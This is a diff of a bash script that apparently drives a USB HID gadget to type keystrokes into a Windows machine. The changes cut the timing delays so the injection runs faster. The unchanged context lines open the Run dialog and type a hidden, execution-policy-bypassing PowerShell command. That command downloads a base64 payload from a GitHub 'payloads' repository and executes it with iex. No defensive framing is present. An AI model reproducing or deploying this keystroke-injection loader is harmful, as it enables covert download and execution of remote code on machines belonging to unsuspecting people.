@@ -43,9 +43,9 @@ declare -A MODIFIERS=(
 send_key() {
   # $1 = modifier, $2 = keycode
   printf "\\x$1\\x00\\x00\\x00\\x00\\x00\\x00\\x$2" > $HID_DEV
-  sleep 0.005
+  sleep 0.0001
   printf "\x00\x00\x00\x00\x00\x00\x00\x00" > $HID_DEV
-  sleep 0.005
+  sleep 0.0001
 }
 
 send_string() {
@@ -70,15 +70,15 @@ send_string() {
 POWERSHELL_CMD="powershell.exe -w Hidden -NoProfile -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
 
 # Start injecting
-sleep 3
+sleep .01
 
 # Press Win+R to open Run dialog
 send_key "08" "15"
-sleep 0.5
+sleep 0.05
 
 # Send the PowerShell command
 send_string "$POWERSHELL_CMD"
-sleep 0.2
+sleep 0.001
 
 # Press Enter
 send_key "00" "28"
